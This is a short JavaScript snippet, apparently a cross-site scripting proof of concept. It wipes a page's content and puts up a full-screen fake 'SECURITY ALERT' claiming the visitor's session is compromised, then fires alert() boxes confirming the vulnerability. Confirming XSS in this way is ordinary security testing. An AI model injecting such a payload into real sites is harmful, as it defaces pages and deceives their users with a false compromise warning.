// Block the entire form
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center;"><div style="background:white;padding:40px;border-radius:10px;text-align:center;"><h1>⚠️ SECURITY ALERT</h1><p>Your session has been compromised!</p><button onclick="alert(1)">Click Me</button></div></div>';

// Or simpler - just alert
alert('XSS VULNERABILITY CONFIRMED!');
